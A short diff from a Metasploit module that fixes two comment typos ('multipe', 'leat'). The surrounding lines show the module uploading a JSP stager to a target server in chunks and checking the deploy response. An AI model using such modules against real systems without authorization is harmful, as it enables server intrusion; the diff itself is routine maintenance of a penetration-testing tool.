@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
       head_stager_uri = '/' + stager_base + '/' + head_stager_jsp_name + '.jsp'
       res = upload_file(stager_base, head_stager_jsp_name, head_stager_contents)
 
-      # We split the stager_jsp_code in multipe junks and transfer on the
+      # We split the stager_jsp_code in multiple junks and transfer on the
       # target with multiple requests
       current_pos = 0
       while current_pos < stager_contents.length
@@ -68,7 +68,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    # Using HEAD may trigger a 500 Internal Server Error (at leat on 4.2.3.GA),
+    # Using HEAD may trigger a 500 Internal Server Error (at least on 4.2.3.GA),
     # but the file still gets written.
     unless res && (res.code == 200 || res.code == 500)
       fail_with(Failure::Unknown, 'Failed to deploy')
